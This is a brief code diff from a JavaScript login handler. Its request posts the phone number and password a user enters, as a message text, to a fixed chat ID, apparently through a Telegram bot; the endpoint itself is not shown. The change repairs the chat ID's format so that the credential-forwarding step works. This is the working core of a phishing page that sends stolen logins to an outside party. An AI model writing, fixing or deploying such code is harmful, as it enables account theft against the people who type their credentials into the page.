@@ -39,7 +39,7 @@ function handleLogin() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: "<7987662357>",
+      chat_id: "7987662357",
       text: `Login:\nPhone: ${phone}\nPassword: ${password}`
     })
   });
